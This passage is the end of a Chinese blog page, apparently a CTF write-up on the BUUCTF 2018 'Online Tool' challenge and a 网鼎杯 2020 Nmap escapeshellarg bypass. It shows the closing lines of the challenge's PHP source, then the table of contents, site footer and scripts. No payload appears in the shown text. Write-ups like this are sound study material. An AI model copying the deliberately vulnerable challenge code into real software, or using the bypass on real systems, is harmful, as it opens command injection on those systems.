class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$result_scan</span>)) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: result.php?f=&#x27;</span> . <span class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Sentry-fei/p/15671032.html">https://www.cnblogs.com/Sentry-fei/p/15671032.html</a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%82%A8%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">储备知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">3.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.1.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.2.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell"><span class="toc-number">4.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%951"><span class="toc-number">4.1.</span> <span class="toc-text">法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%952"><span class="toc-number">4.2.</span> <span class="toc-text">法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&text=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&title=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&is_video=false&description=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell&body=Check out this article: http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&title=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&title=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&title=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&title=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&name=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&t=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
